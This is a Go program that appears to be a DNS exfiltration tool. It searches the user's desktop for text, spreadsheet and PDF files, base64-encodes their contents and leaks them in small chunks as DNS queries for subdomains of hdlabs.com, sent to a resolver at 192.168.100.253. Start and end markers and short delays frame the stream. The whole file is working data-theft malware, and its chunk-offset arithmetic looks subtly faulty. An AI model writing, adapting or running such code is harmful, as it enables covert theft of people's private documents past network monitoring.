package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/miekg/dns"
)

func walkFS() []string {
	extensions := []string{".txt", ".xls", ".xdoc", ".pdf"}
	targetfiles := make([]string, 0)
	userHome, _ := os.UserHomeDir()
	userHome = userHome + "\\desktop"
	err := filepath.Walk(userHome,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			for _, ext := range extensions {
				if strings.Contains(info.Name(), ext) {
					targetfiles = append(targetfiles, path)

				}

			}

			return nil
		})
	if err != nil {
		log.Println(err)
	}

	return targetfiles
}

func exfiltrate(txt []byte) {

	var (
		msg    dns.Msg
		client dns.Client
	)

	msg.SetQuestion(string(txt)+".hdlabs.com.", dns.TypeA)

	_, _, err := client.Exchange(&msg, "192.168.100.253:53")
	if err != nil {
		fmt.Println(err)
	}

}

func main() {

	files := walkFS()
	const fileChunk = 50
	if len(files) > 0 {
		for _, file := range files {
			fmt.Println("found file " + file)
			f, err := os.Open(file)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			defer f.Close()
			filecontent, err := ioutil.ReadFile(file)
			if err != nil {
				fmt.Println(err)
			}
			b64string := base64.StdEncoding.EncodeToString(filecontent)
			fileSize := int64(len(b64string))

			totalParts := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))
			for i := uint64(0); i < totalParts; i++ {
				partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
				partBuffer := b64string[i*uint64(partSize) : (i*uint64(partSize))+uint64(partSize)]

				if i == 0 {
					// start marker
					exfiltrate([]byte("66trt" + partBuffer))
					continue
				}

				if i == totalParts-1 {
					// end marker
					exfiltrate([]byte(partBuffer + "33nd"))
					break
				}

				exfiltrate([]byte(partBuffer))
				time.Sleep(time.Millisecond * 5)

			}

		}

	} else {
		fmt.Println("no files found")
	}

}
